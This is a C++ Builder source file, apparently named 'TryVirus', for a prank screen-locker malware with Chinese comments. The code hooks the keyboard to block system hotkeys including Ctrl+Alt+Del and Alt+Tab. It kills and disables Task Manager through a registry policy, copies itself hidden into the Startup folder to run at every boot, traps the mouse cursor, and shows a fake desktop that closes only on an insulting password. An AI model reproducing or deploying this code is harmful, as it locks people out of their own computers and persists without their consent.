//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "TryVirus.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TMyForm *MyForm;


 HHOOK   OldHook ;
 
//---------------------------------------------------------------------------
__fastcall TMyForm::TMyForm(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------
/*
底 层键盘钩子存在于用户敲击键盘和系统处理之间，
而普通键盘钩子则存在于系统产生WM_KEYxxx之后。很清楚，
普通键盘钩子只能截获WM_KEYxxx消息，而不能对系统键进行操作。
但是底层键盘钩子有一个致命的弱点，就是如果调用它的进程或线程出现死循环，
系统将不能处理任何键盘操作。为了解决这个问题，
微软在注册表中给出了一个底层键盘钩子处理的限制时间，如果超出了这个时间，
系统将正常处理。这个时间的键值在注册表的
HKEY_CURRENT_USER\Control Panel\Desktop\ LowLevelHooksTimeout下给出。
HHOOK SetWindowsHookEx(  int iHookCode,HOOKPROC lpfn,
                    HINSTANCE hModule,DWORD dwThreadId);
  其中，第一个参数是钩子的类型；第二个参数是钩子函数的地址；
  第三个参数是包含钩子函数的模块句柄；第四个参数指定监视的线程。
  如果指定确定的线程，即为线程专用钩子；如果指定为空，即为全局钩子。
  其中，全局钩子函数必须包含在DLL（动态链接库）中，
  而线程专用钩子还可以包含在可执行文件中。得到控制权的钩子函数在完成对消息的处理后，
  如果想要该消息继续传递，那么它必须调用另外一个SDK中的API函数CallNextHookEx来传递它。
  钩子函数也可以通过直接返回TRUE来丢弃该消息，并阻止该消息的传递。
*/
void __fastcall TMyForm::WMKEYDOWN(TWMKey &Msg)
{
    if(Msg.KeyData==VK_LWIN || Msg.KeyData==VK_RWIN )
        Msg.Result = ' ' ;
    if(Msg.KeyData==13 )
        Msg.Result = 27 ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::WMKEYUP(TWMKey &Msg)
{
    if(Msg.KeyData==VK_LWIN || Msg.KeyData==VK_RWIN )
        Msg.Result = ' ' ;
    if(Msg.KeyData==13 )
        Msg.Result = 27 ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::MYHOTKEY(TWMHotKey &Msg)
{    //?????what why ////
    if( Msg.HotKey==VK_F4|VK_MENU)
    {    ///!!!!!//
        ShowMessage(" TWMHotKey -- Alt + F4 ")  ;
  //      Msg.HotKey =
        SetForegroundWindow(Handle);
    }
}
//---------------------------------------------------------------------------
LRESULT  CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
      bool fEatKeystroke = FALSE ;
      if (nCode == HC_ACTION)
      {
        switch (wParam)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            case WM_KEYUP:
            case WM_SYSKEYUP:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
            fEatKeystroke =  ((p->vkCode == VK_TAB) && ((p->flags & LLKHF_ALTDOWN) != 0)) ||
                    ((p->vkCode == VK_ESCAPE) &&((p->flags & LLKHF_ALTDOWN) != 0)) ||
                    ((p->vkCode == VK_ESCAPE) && ((GetKeyState(VK_CONTROL) & 0x8000) != 0)) ;
            break ;
        }
      }
      return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam,lParam)) ;
}
//键盘钩子 封锁 windows 热键
LRESULT CALLBACK KeyProc(int code, WPARAM wParam, LPARAM lParam) //LRESULT --long
{
    KBDLLHOOKSTRUCT *pkbhs;
    if (code < 0)
    {
        return CallNextHookEx(OldHook,code, wParam, lParam);
    }
    pkbhs = (KBDLLHOOKSTRUCT*) lParam;
    if (pkbhs->vkCode==91)//封锁win键
    {
        return 1;
    }
    if (pkbhs->vkCode==VK_ESCAPE && GetAsyncKeyState(VK_CONTROL)<0)
    {
        return 1; //封锁 CTRL+ESC
    }
    if (pkbhs->vkCode==VK_TAB && pkbhs->flags&LLKHF_ALTDOWN)
    {
        return 1; //封锁 ALT+TAB
    }
    if (pkbhs->vkCode==VK_F4 && pkbhs->flags&LLKHF_ALTDOWN)//F4 --VK_F4 ,or Aciia 115
    {
        return 1; //封锁 ALT+F4
    }
    if (pkbhs->vkCode==VK_ESCAPE && pkbhs->flags&LLKHF_ALTDOWN)
    {
        return 1; //封锁 ALT+ESC
    }
    if (pkbhs->vkCode==VK_SPACE &&  GetAsyncKeyState(VK_CONTROL)<0)
    {
        return 1; //封锁 CTRL+ ' '
    }

    if (pkbhs->vkCode == VK_DELETE && pkbhs->flags&LLKHF_ALTDOWN && GetAsyncKeyState(VK_CONTROL) < 0)//&& pkbhs->vkCode == VK_DELETE<0)
    {
        return 1; //封锁 CTRL+ ALT +del
    }
    if (pkbhs->vkCode == VK_F12&& pkbhs->flags&LLKHF_ALTDOWN )//&& pkbhs->vkCode == VK_DELETE<0)
    {
        SendMessage(Application->Handle ,WM_CLOSE ,0 ,0) ; //封锁 CTRL+ ALT +F12 退出
        return 1;
    }
    return CallNextHookEx(OldHook,code, wParam, lParam);
}
//---------------------------------------------------------------------------
void    DisableTaskmgr(bool Key)
{
    TRegistry   *Reg = new TRegistry() ;
    Reg->RootKey = HKEY_CURRENT_USER ;
    if ( Reg->OpenKey("\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
    {
      if (Key)
        Reg->WriteString("DisableTaskMgr","1") ;
      else
        Reg->WriteInteger("DisableTaskMgr",0) ;
    }
    Reg->CloseKey();
    delete Reg ;
    SystemParametersInfo(SPI_SETDESKWALLPAPER ,0 ,NULL ,SPIF_SENDCHANGE) ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::FormCreate(TObject *Sender)
{
/*    */
   // SystemParametersInfo(...) //win95/win98操作系统下：
         //通过向系统发送屏幕保护程序来屏蔽系统热键
    OldHook = SetWindowsHookEx( WH_KEYBOARD_LL, (HOOKPROC)KeyProc, HInstance, 0);
    int temp;
    SystemParametersInfo(SPI_SCREENSAVERRUNNING,1,&temp,0);    /*
    //恢复系统热键
    int temp;
    SystemParametersInfo(SPI_SCREENSAVERRUNNING,0,&temp,0);
     //按装底层键盘钩子
    HHOOK hhkLowLevelKybd = ::SetWindowsHookEx(WH_KEYBOARD_LL,
                                (HOOKPROC)LowLevelKeyboardProc, HInstance, 0 ) ;// LowLevelKeyboardProc
   MessageBox( NULL, TEXT("Alt+Esc, Ctrl+Esc, and Alt+Tab are now disabled.\n")
                TEXT("Click \"Ok\" to terminate this application and re-enable these keys."),
                TEXT("Disable Low-Level Keys"), MB_OK);     
    UnhookWindowsHookEx(hhkLowLevelKybd);    */
    //使应用程序不出现在任务栏
    SetWindowLong(Application->Handle,GWL_EXSTYLE,WS_EX_TOOLWINDOW);
    this->WindowState = wsMaximized ;
    this->BorderStyle = bsNone ;
    this->FormStyle = fsStayOnTop ;
    ImageScreen->Align = alClient ;
    //关闭 任务管理器
    HWND    taskmgrHandle = FindWindow(NULL ,"Windows 任务管理器") ;
    SendMessage(taskmgrHandle ,WM_CLOSE ,0 ,0) ;
    DisableTaskmgr(true) ; //true,屏蔽“任务管理器”
 //复制文件到系统启动！！！
//    ShowMessage(Application->ExeName) ;
    String  filepath  = "C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\"
                        + Application->Title+".exe" ;
//   1111111
    if(CopyFile(Application->ExeName.c_str() ,filepath.c_str() ,false))// Application->ExeName
        ;//ShowMessage("OK !") ;
    else
        ;//ShowMessage("Error !") ;
    FileSetAttr(filepath ,2 ) ; //隐藏文件
    /*
extern PACKAGE int __fastcall FileSetAttr(const AnsiString FileName, int Attr);
faReadOnly	0x01	Read-only files
faHidden	0x02	Hidden files
faSysFile	0x04	System files
faVolumeID	0x08	Volume ID files
faDirectory	0x010	Directory files
faArchive	0x020	Archive files
faAnyFile	0x03F	Any file
    */
    /*  222222222222
    if(CopyFileTo(Application->ExeName ,filepath+"\\" +Application->Title+".exe"))
        ShowMessage("OK !") ;
    else
        ShowMessage("Error !") ;   */
    //LabeledEdit1->e ;
}
//---------------------------------------------------------------------------

void     TMyForm::CaptureDesktop(HDC ImageHandle )
{
    HDC hdc = GetDC(0) ;
    BitBlt(ImageHandle ,0 ,0 ,Screen->Width ,
            Screen->Height ,hdc ,0 ,0 ,SRCCOPY ) ;
    ReleaseDC(0 ,hdc) ;
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::Timer1Timer(TObject *Sender)
{
    static int  timecount = 0 ;
    timecount++ ;
    if( timecount==3 )
    {
        this->Visible = false ;
        ImageHello->Visible = false ;
    }
    else if( timecount==6 )
    {
        ImageScreen->Canvas->FillRect(ImageScreen->Canvas->ClipRect) ;
        Sleep(1000) ;
        CaptureDesktop(ImageScreen->Canvas->Handle) ;
        this->Visible = true ;
        timecount = 0 ;
        Timer1->Enabled = false ;
        Timer2->Enabled = true ;
    }

}
//---------------------------------------------------------------------------

void __fastcall TMyForm::ImageScreenMouseDown(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
        TRect MyArea = TRect(100 ,100 ,120 ,120) ;//锁定鼠标、、、
        MapWindowPoints(Handle,0,(LPPOINT)(&MyArea),2);
        ClipCursor(&MyArea);
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::FormKeyDown(TObject *Sender, WORD &Key,
      TShiftState Shift)
{
    if(Key==27)
        Close() ;
    if( Key==VK_LWIN || Key==VK_RWIN )
        ImageHello->Visible = true ;
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::FormDestroy(TObject *Sender)
{
    DisableTaskmgr(false) ; //为False,“任务管理器”可用
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::LabeledEdit1KeyPress(TObject *Sender, char &Key)
{
    if(Key==13)
    {
        if(LabeledEdit1->Text=="我是傻B") //LabeledEdit1
            Close() ;
        else
           LabeledEdit1->Text = "" ;
    }
}
//---------------------------------------------------------------------------


void __fastcall TMyForm::Timer2Timer(TObject *Sender)
{
    static bool  changeimage = false ;
    if(changeimage)
    {
        ImageHello->Visible = false ;
        ImageScreen->Visible = true ;
        LabeledEdit1->Visible = false ;
        changeimage = false ;
    }
    else
    {
        ImageHello->Visible = true ;
        ImageScreen->Visible = false ;
        LabeledEdit1->Visible = true ;
        LabeledEdit1->SetFocus() ;
        changeimage = true ;
    }

}
//---------------------------------------------------------------------------

